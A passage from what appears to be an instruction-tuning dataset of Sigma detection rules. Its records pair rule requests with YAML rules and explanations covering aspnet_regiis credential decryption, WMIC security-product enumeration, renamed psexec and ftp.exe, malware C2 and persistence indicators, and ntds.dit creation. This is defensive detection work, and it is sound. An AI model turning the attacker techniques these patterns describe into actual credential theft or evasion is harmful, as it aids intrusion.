      "answer": "In order to detect the use of aspnet_regiis to decrypt Microsoft IIS connection strings, where an attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command, you should: Monitor for the creation of processes on Windows systems that involve the aspnet_regiis.exe file, particularly when the command line executed includes both 'connectionStrings' and '-pdf'. This detection is critical as it identifies attempts to decrypt and access sensitive information typically found in Microsoft IIS connection strings, which could include service account passwords. Flagging any instances where these criteria are met is crucial since this activity is highly suspicious and often indicative of an attacker exploiting access to a Microsoft IIS web server to extract sensitive data. Although the possibility of false positives is noted as unknown, the high level of concern warrants close observation of events matching these conditions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of WMIC in order to get a list of firewall and antivirus products.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of WMIC in order to get a list of firewall and antivirus products, you should: Monitor the creation of processes on Windows systems for events where the image ending matches '\\wmic.exe' or where the original file name is exactly 'wmic.exe'. Additionally, inspect the command line arguments for the presence of strings 'AntiVirusProduct' or 'FirewallProduct'. This detection is based on observing both the specific process being initiated and the nature of the command line instructions it's being given, aiming to catch attempts to enumerate installed security software through WMIC commands. The level of trust in these detections is medium, although it's noted that there could be scenarios (unknown at this time) where such activity could be legitimate.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'AntiVirusProduct'\n            - 'FirewallProduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'AntiVirusProduct'\n            - 'FirewallProduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of WMIC in order to get a list of firewall and antivirus products",
      "answer": "In order to detect the execution of WMIC in order to get a list of firewall and antivirus products, you should: Monitor the creation of processes on Windows systems for events where the image ending matches '\\wmic.exe' or where the original file name is exactly 'wmic.exe'. Additionally, inspect the command line arguments for the presence of strings 'AntiVirusProduct' or 'FirewallProduct'. This detection is based on observing both the specific process being initiated and the nature of the command line instructions it's being given, aiming to catch attempts to enumerate installed security software through WMIC commands. The level of trust in these detections is medium, although it's noted that there could be scenarios (unknown at this time) where such activity could be legitimate."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of psexec or paexec with renamed service name, helping to filter out the noise if psexec is used for legitimate purposes or if an attacker uses a different psexec client other than the sysinternal one, you should: Monitor Windows security logs for events with ID 5145, which are related to the advanced audit policy setting \"Object Access > Audit Detailed File Share\", configured for both Success and Failure. Specifically, look for events where the ShareName includes '\\\\*\\IPC$', a common indicator of psexec or paexec usage. Additionally, pay attention to the RelativeTargetName field for entries ending with '-stdin', '-stdout', or '-stderr', as these are often associated with the execution of remote commands or scripts via these tools. However, to reduce false positives and filter out legitimate use cases of psexec by system administrators, exclude any events where the RelativeTargetName starts with 'PSEXESVC'. This approach helps in identifying misuse of administrative tools and potential lateral movement or remote execution efforts by attackers, without overly focusing on legitimate administrative activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n        RelativeTargetName|endswith:\n            - '-stdin'\n            - '-stdout'\n            - '-stderr'\n    filter:\n        RelativeTargetName|startswith: 'PSEXESVC'\n    condition: selection1 and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n        RelativeTargetName|endswith:\n            - '-stdin'\n            - '-stdout'\n            - '-stderr'\n    filter:\n        RelativeTargetName|startswith: 'PSEXESVC'\n    condition: selection1 and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one",
      "answer": "In order to detect execution of psexec or paexec with renamed service name, helping to filter out the noise if psexec is used for legitimate purposes or if an attacker uses a different psexec client other than the sysinternal one, you should: Monitor Windows security logs for events with ID 5145, which are related to the advanced audit policy setting \"Object Access > Audit Detailed File Share\", configured for both Success and Failure. Specifically, look for events where the ShareName includes '\\\\*\\IPC$', a common indicator of psexec or paexec usage. Additionally, pay attention to the RelativeTargetName field for entries ending with '-stdin', '-stdout', or '-stderr', as these are often associated with the execution of remote commands or scripts via these tools. However, to reduce false positives and filter out legitimate use cases of psexec by system administrators, exclude any events where the RelativeTargetName starts with 'PSEXESVC'. This approach helps in identifying misuse of administrative tools and potential lateral movement or remote execution efforts by attackers, without overly focusing on legitimate administrative activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT, you should: Monitor Windows image load events for instances where the 'svchost.exe' process is loading a DLL named 'newdev.dll' from a location within the user's AppData\\Roaming directory. Such behavior is indicative of a potential ColdSteel RAT infection, as this specific DLL location and name have been associated with the malware's persistence mechanism. Events matching these criteria should raise a high alert, as false positives are considered unlikely. This monitoring focuses on identifying techniques employed by the RAT for maintaining persistence and executing malicious code, related to the tactics of persistence and execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n        ImageLoaded|endswith: '\\AppData\\Roaming\\newdev.dll'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n        ImageLoaded|endswith: '\\AppData\\Roaming\\newdev.dll'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n",
      "answer": "In order to detect a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT, you should: Monitor Windows image load events for instances where the 'svchost.exe' process is loading a DLL named 'newdev.dll' from a location within the user's AppData\\Roaming directory. Such behavior is indicative of a potential ColdSteel RAT infection, as this specific DLL location and name have been associated with the malware's persistence mechanism. Events matching these criteria should raise a high alert, as false positives are considered unlikely. This monitoring focuses on identifying techniques employed by the RAT for maintaining persistence and executing malicious code, related to the tactics of persistence and execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the Impersonate tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the Impersonate tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should monitor for specific activity indicative of this tool's operation within Windows process creation logs. Look for the execution of a process named \"impersonate.exe\" in the command line. Additionally, watch for command-line options indicative of the tool's use, such as 'list', 'exec', and 'adduser'. To enhance the detection accuracy, also check for the presence of specific hash values associated with the Impersonate tool. These hash values include an MD5 hash of '9520714AB576B0ED01D1513691377D01', a SHA256 hash of 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A', and an IMPHASH of '0A358FFC1697B7A07D0E817AC740DF62'. The detection should trigger if any of the command-line criteria are met or if one of the specified hashes is identified. Maintaining a cautious approach to potential false positives is advised, as their occurrence is currently deemed unknown. This observance is evaluated at a medium level of importance in the context of cybersecurity efforts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_commandline_exe:\n        CommandLine|contains: 'impersonate.exe'\n    selection_commandline_opt:\n        CommandLine|contains:\n            - ' list '\n            - ' exec '\n            - ' adduser '\n    selection_hash_plain:\n        Hashes|contains:\n            - 'MD5=9520714AB576B0ED01D1513691377D01'\n            - 'SHA256=E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n            - 'IMPHASH=0A358FFC1697B7A07D0E817AC740DF62'\n    selection_hash_ext:\n        - md5: '9520714AB576B0ED01D1513691377D01'\n        - sha256: 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n        - Imphash: '0A358FFC1697B7A07D0E817AC740DF62'\n    condition: all of selection_commandline_* or 1 of selection_hash_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_commandline_exe:\n        CommandLine|contains: 'impersonate.exe'\n    selection_commandline_opt:\n        CommandLine|contains:\n            - ' list '\n            - ' exec '\n            - ' adduser '\n    selection_hash_plain:\n        Hashes|contains:\n            - 'MD5=9520714AB576B0ED01D1513691377D01'\n            - 'SHA256=E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n            - 'IMPHASH=0A358FFC1697B7A07D0E817AC740DF62'\n    selection_hash_ext:\n        - md5: '9520714AB576B0ED01D1513691377D01'\n        - sha256: 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n        - Imphash: '0A358FFC1697B7A07D0E817AC740DF62'\n    condition: all of selection_commandline_* or 1 of selection_hash_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of the Impersonate tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively",
      "answer": "In order to detect execution of the Impersonate tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should monitor for specific activity indicative of this tool's operation within Windows process creation logs. Look for the execution of a process named \"impersonate.exe\" in the command line. Additionally, watch for command-line options indicative of the tool's use, such as 'list', 'exec', and 'adduser'. To enhance the detection accuracy, also check for the presence of specific hash values associated with the Impersonate tool. These hash values include an MD5 hash of '9520714AB576B0ED01D1513691377D01', a SHA256 hash of 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A', and an IMPHASH of '0A358FFC1697B7A07D0E817AC740DF62'. The detection should trigger if any of the command-line criteria are met or if one of the specified hashes is identified. Maintaining a cautious approach to potential false positives is advised, as their occurrence is currently deemed unknown. This observance is evaluated at a medium level of importance in the context of cybersecurity efforts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting new owner is added to an application. This gives that account privileges to make modifications and configuration changes to the application..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a new owner is added to an application, which gives that account privileges to make modifications and configuration changes to the application, you should monitor the Azure audit logs for events where the message indicates an owner has been added to an application. This involves looking for logs with the property message containing the phrase \"Add owner to application.\" It is important to consider that legitimate management activities may trigger this detection, such as when a new application owner is added by an administrator. This scenario is considered a medium-level threat because adding a new owner can potentially lead to unauthorized changes or access if done maliciously.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Add owner to application\n    condition: selection\nfalsepositives:\n    - When a new application owner is added by an administrator\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Add owner to application\n    condition: selection\nfalsepositives:\n    - When a new application owner is added by an administrator\nlevel: medium\n",
      "question": "new owner is added to an application. This gives that account privileges to make modifications and configuration changes to the application.",
      "answer": "In order to detect when a new owner is added to an application, which gives that account privileges to make modifications and configuration changes to the application, you should monitor the Azure audit logs for events where the message indicates an owner has been added to an application. This involves looking for logs with the property message containing the phrase \"Add owner to application.\" It is important to consider that legitimate management activities may trigger this detection, such as when a new application owner is added by an administrator. This scenario is considered a medium-level threat because adding a new owner can potentially lead to unauthorized changes or access if done maliciously."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of a renamed \"ftp.exe\" binary based on the PE metadata fields.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of a renamed \"ftp.exe\" binary based on the PE metadata fields, you should monitor process creation logs in Windows systems. Look for instances where the original file name is identified as 'ftp.exe' according to its PE (Portable Executable) metadata fields, but the actual image name of the running process does not end with '\\ftp.exe'. This helps identify situations where the \"ftp.exe\" binary might have been renamed to evade detection. It's important to capture and analyze the command line used for the execution and the parent image from which the process was spawned for further investigation. Be mindful that there could be legitimate scenarios that trigger this detection, although they are not specified. This activity is rated with a medium level of severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_original:\n        OriginalFileName: 'ftp.exe'\n    filter_img:\n        Image|endswith: '\\ftp.exe'\n    condition: selection_original and not filter_img\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_original:\n        OriginalFileName: 'ftp.exe'\n    filter_img:\n        Image|endswith: '\\ftp.exe'\n    condition: selection_original and not filter_img\nfields:\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of a renamed \"ftp.exe\" binary based on the PE metadata fields",
      "answer": "In order to detect the execution of a renamed \"ftp.exe\" binary based on the PE metadata fields, you should monitor process creation logs in Windows systems. Look for instances where the original file name is identified as 'ftp.exe' according to its PE (Portable Executable) metadata fields, but the actual image name of the running process does not end with '\\ftp.exe'. This helps identify situations where the \"ftp.exe\" binary might have been renamed to evade detection. It's important to capture and analyze the command line used for the execution and the parent image from which the process was spawned for further investigation. Be mindful that there could be legitimate scenarios that trigger this detection, although they are not specified. This activity is rated with a medium level of severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting BITS transfer job downloading file(s) from a direct IP address..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a BITS transfer job downloading file(s) from a direct IP address, you should monitor Windows BITS Client logs for events with an ID of 16403 that indicate a file download initiated from URLs starting with numerals 1 through 9 using either HTTP or HTTPS protocols. This detection focuses on excluding common false positives by not alerting on BITS jobs if the download originates from local network addresses, which include IP ranges like 10.x.x.x, 192.168.x.x, and various segments within the 172.16.x.x to 172.31.x.x ranges, alongside the localhost address range 127.x.x.x and the automatic private IP address range 169.254.x.x. Additionally, downloads from the legitimate website of the 7-Zip utility, indicated by URLs beginning with 'http://7-' or 'https://7-', are also filtered out to reduce false positives. It's crucial to pay attention to events that bypass these filters as they represent a high risk of malicious activities where BITS jobs are misused to download potentially harmful files directly from the internet using direct IP addresses, bypassing more easily monitored domain-based network traffic. This methodology aligns with proactive cybersecurity strategies to identify potential intrusion attempts or malware infections that exploit BITS for stealthy file downloads.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: bits-client\ndetection:\n    selection:\n        EventID: 16403\n        RemoteName|contains:\n            - 'http://1'\n            - 'http://2'\n            - 'http://3'\n            - 'http://4'\n            - 'http://5'\n            - 'http://6'\n            - 'http://7'\n            - 'http://8'\n            - 'http://9'\n            - 'https://1'\n            - 'https://2'\n            - 'https://3'\n            - 'https://4'\n            - 'https://5'\n            - 'https://6'\n            - 'https://7'\n            - 'https://8'\n            - 'https://9'\n    filter_optional_local_networks:\n        RemoteName|contains:\n            - '://10.' #10.0.0.0/8\n            - '://192.168.' #192.168.0.0/16\n            - '://172.16.' #172.16.0.0/12\n            - '://172.17.'\n            - '://172.18.'\n            - '://172.19.'\n            - '://172.20.'\n            - '://172.21.'\n            - '://172.22.'\n            - '://172.23.'\n            - '://172.24.'\n            - '://172.25.'\n            - '://172.26.'\n            - '://172.27.'\n            - '://172.28.'\n            - '://172.29.'\n            - '://172.30.'\n            - '://172.31.'\n            - '://127.' #127.0.0.0/8\n            - '://169.254.' #169.254.0.0/16\n    filter_optional_seven_zip:\n        RemoteName|contains:\n            # For https://7-zip.org/\n            - 'https://7-'\n            - 'http://7-'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: bits-client\ndetection:\n    selection:\n        EventID: 16403\n        RemoteName|contains:\n            - 'http://1'\n            - 'http://2'\n            - 'http://3'\n            - 'http://4'\n            - 'http://5'\n            - 'http://6'\n            - 'http://7'\n            - 'http://8'\n            - 'http://9'\n            - 'https://1'\n            - 'https://2'\n            - 'https://3'\n            - 'https://4'\n            - 'https://5'\n            - 'https://6'\n            - 'https://7'\n            - 'https://8'\n            - 'https://9'\n    filter_optional_local_networks:\n        RemoteName|contains:\n            - '://10.' #10.0.0.0/8\n            - '://192.168.' #192.168.0.0/16\n            - '://172.16.' #172.16.0.0/12\n            - '://172.17.'\n            - '://172.18.'\n            - '://172.19.'\n            - '://172.20.'\n            - '://172.21.'\n            - '://172.22.'\n            - '://172.23.'\n            - '://172.24.'\n            - '://172.25.'\n            - '://172.26.'\n            - '://172.27.'\n            - '://172.28.'\n            - '://172.29.'\n            - '://172.30.'\n            - '://172.31.'\n            - '://127.' #127.0.0.0/8\n            - '://169.254.' #169.254.0.0/16\n    filter_optional_seven_zip:\n        RemoteName|contains:\n            # For https://7-zip.org/\n            - 'https://7-'\n            - 'http://7-'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "BITS transfer job downloading file(s) from a direct IP address.",
      "answer": "In order to detect a BITS transfer job downloading file(s) from a direct IP address, you should monitor Windows BITS Client logs for events with an ID of 16403 that indicate a file download initiated from URLs starting with numerals 1 through 9 using either HTTP or HTTPS protocols. This detection focuses on excluding common false positives by not alerting on BITS jobs if the download originates from local network addresses, which include IP ranges like 10.x.x.x, 192.168.x.x, and various segments within the 172.16.x.x to 172.31.x.x ranges, alongside the localhost address range 127.x.x.x and the automatic private IP address range 169.254.x.x. Additionally, downloads from the legitimate website of the 7-Zip utility, indicated by URLs beginning with 'http://7-' or 'https://7-', are also filtered out to reduce false positives. It's crucial to pay attention to events that bypass these filters as they represent a high risk of malicious activities where BITS jobs are misused to download potentially harmful files directly from the internet using direct IP addresses, bypassing more easily monitored domain-based network traffic. This methodology aligns with proactive cybersecurity strategies to identify potential intrusion attempts or malware infections that exploit BITS for stealthy file downloads."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a file named \"ntds.dit\" (Active Directory Database).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a file named \"ntds.dit\" (Active Directory Database), you should monitor file event logs on Windows systems. Specifically, look for events where a file has been created that ends with the name 'ntds.dit'. Given the context of this action occurring within Windows environments, it is pertinent to analyze the file event logs to spot any instance of this significant event. It is noteworthy that this behaviour might occasionally flag false positives, though they are unspecified, indicating that not every detection might represent a genuine threat. Nonetheless, owing to the critical nature linked with the 'ntds.dit' file, which is central to Active Directory operations and data storage, any creation event for a file with this name is tagged with a low level of threat indication but should not be disregarded without proper investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: 'ntds.dit'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: 'ntds.dit'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "creation of a file named \"ntds.dit\" (Active Directory Database)",
      "answer": "In order to detect the creation of a file named \"ntds.dit\" (Active Directory Database), you should monitor file event logs on Windows systems. Specifically, look for events where a file has been created that ends with the name 'ntds.dit'. Given the context of this action occurring within Windows environments, it is pertinent to analyze the file event logs to spot any instance of this significant event. It is noteworthy that this behaviour might occasionally flag false positives, though they are unspecified, indicating that not every detection might represent a genuine threat. Nonetheless, owing to the critical nature linked with the 'ntds.dit' file, which is central to Active Directory operations and data storage, any creation event for a file with this name is tagged with a low level of threat indication but should not be disregarded without proper investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential C2 communication related to Devil Bait malware.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential C2 communication related to Devil Bait malware, you should: focus on monitoring proxy logs for specific patterns of HTTP GET requests. Look for requests that include the following indicators in their URL: '/cross.php?op=', '&dt=', and '&uid='. These parameters within the requests are characteristic of communication patterns associated with Devil Bait malware, attempting to reach out to its command and control servers. This type of analysis is crucial for identifying potential breaches, as the detection of these specific request patterns, especially when they are found together in proxy logs, is a strong indicator of malicious activity linked to Devil Bait malware. False positives are considered unlikely due to the specificity of these patterns, indicating that such detection should be treated with a high level of concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-uri|all:\n            - '/cross.php?op='\n            - '&dt='\n            - '&uid='\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-uri|all:\n            - '/cross.php?op='\n            - '&dt='\n            - '&uid='\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential C2 communication related to Devil Bait malware",
      "answer": "In order to detect potential C2 communication related to Devil Bait malware, you should: focus on monitoring proxy logs for specific patterns of HTTP GET requests. Look for requests that include the following indicators in their URL: '/cross.php?op=', '&dt=', and '&uid='. These parameters within the requests are characteristic of communication patterns associated with Devil Bait malware, attempting to reach out to its command and control servers. This type of analysis is crucial for identifying potential breaches, as the detection of these specific request patterns, especially when they are found together in proxy logs, is a strong indicator of malicious activity linked to Devil Bait malware. False positives are considered unlikely due to the specificity of these patterns, indicating that such detection should be treated with a high level of concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk, you should monitor Windows Security logs, specifically looking for events with an ID of 5145. This event ID is crucial because it tracks access attempts to shared objects over a network. You should focus on entries where the object type is a file, and more specifically, end with '\\desktop.ini'. The desktop.ini file is of interest here because it controls how folders are displayed in Windows Explorer and can be manipulated to misrepresent folder contents without actually altering the files themselves.\n\nAdditionally, pay close attention to the access list within the event data for actions that include 'WriteData', 'DELETE', 'WriteDAC', 'AppendData', or 'AddSubdirectory'. These actions signify potential manipulation or harmful interaction with the desktop.ini file, such as attempting to write data to it, delete it, change discretionary access control lists (DACs), append data, or add subdirectories\u2014all of which could be indicators of an attacker trying to exploit how folder contents are displayed.\n\nIt's important to be aware of false positives that may arise, especially from entries that only show read-only access list authority, which might not be indicative of malicious activity. The detection sensitivity is set to a medium level, reflecting a balanced approach to capturing potential threats while minimizing the noise from benign activities.\n\nKey tags associated with this detection effort fall under tactics and techniques that include Initial Access, Execution, Persistence, Privilege Escalation, and Defense Evasion. These tags help categorize the type of actions attackers are taking or attempting to take by abusing the desktop.ini file over network shares. Monitoring for such activities allows defenders to catch and respond to unconventional methods attackers use to manipulate file and directory perceptions, aiding in the protection of sensitive information and system integrity against stealthy modifications or reconnaissance activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        ObjectType: File\n        RelativeTargetName|endswith: '\\desktop.ini'\n        AccessList|contains:\n            - 'WriteData'\n            - 'DELETE'\n            - 'WriteDAC'\n            - 'AppendData'\n            - 'AddSubdirectory'\n    condition: selection\nfalsepositives:\n    - Read only access list authority\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        ObjectType: File\n        RelativeTargetName|endswith: '\\desktop.ini'\n        AccessList|contains:\n            - 'WriteData'\n            - 'DELETE'\n            - 'WriteDAC'\n            - 'AppendData'\n            - 'AddSubdirectory'\n    condition: selection\nfalsepositives:\n    - Read only access list authority\nlevel: medium\n",
      "question": "unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk.",
      "answer": "In order to detect unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk, you should monitor Windows Security logs, specifically looking for events with an ID of 5145. This event ID is crucial because it tracks access attempts to shared objects over a network. You should focus on entries where the object type is a file, and more specifically, end with '\\desktop.ini'. The desktop.ini file is of interest here because it controls how folders are displayed in Windows Explorer and can be manipulated to misrepresent folder contents without actually altering the files themselves.\n\nAdditionally, pay close attention to the access list within the event data for actions that include 'WriteData', 'DELETE', 'WriteDAC', 'AppendData', or 'AddSubdirectory'. These actions signify potential manipulation or harmful interaction with the desktop.ini file, such as attempting to write data to it, delete it, change discretionary access control lists (DACs), append data, or add subdirectories\u2014all of which could be indicators of an attacker trying to exploit how folder contents are displayed.\n\nIt's important to be aware of false positives that may arise, especially from entries that only show read-only access list authority, which might not be indicative of malicious activity. The detection sensitivity is set to a medium level, reflecting a balanced approach to capturing potential threats while minimizing the noise from benign activities.\n\nKey tags associated with this detection effort fall under tactics and techniques that include Initial Access, Execution, Persistence, Privilege Escalation, and Defense Evasion. These tags help categorize the type of actions attackers are taking or attempting to take by abusing the desktop.ini file over network shares. Monitoring for such activities allows defenders to catch and respond to unconventional methods attackers use to manipulate file and directory perceptions, aiding in the protection of sensitive information and system integrity against stealthy modifications or reconnaissance activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service creation persistence used by the Goofy Guineapig backdoor.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service creation persistence used by the Goofy Guineapig backdoor, you should focus on monitoring Windows system service logs for specific events that indicate potential malicious activity. Look for logs from the Service Control Manager with an Event ID of 7045. This event ID indicates a service was installed on the system. Pay special attention to any service named 'GoogleUpdate'. However, the critical aspect to look out for in identifying this specific backdoor is the path specified in the service's installation. If the ImagePath contains all the following sequences: 'rundll32', 'FileProtocolHandler', and includes a path that seems to be '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe', it suggests that the service being installed is not a legitimate Google Update service but is instead masquerading as one to gain persistence on the system. Given the specifics of the detection method, false positives are considered unlikely. The severity of this type of detection is marked as critical due to the potential impact of allowing backdoor access to persist on a compromised system through seemingly legitimate service creation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'GoogleUpdate'\n        ImagePath|contains|all:\n            - 'rundll32'\n            - 'FileProtocolHandler'\n            - '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'GoogleUpdate'\n        ImagePath|contains|all:\n            - 'rundll32'\n            - 'FileProtocolHandler'\n            - '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "service creation persistence used by the Goofy Guineapig backdoor",
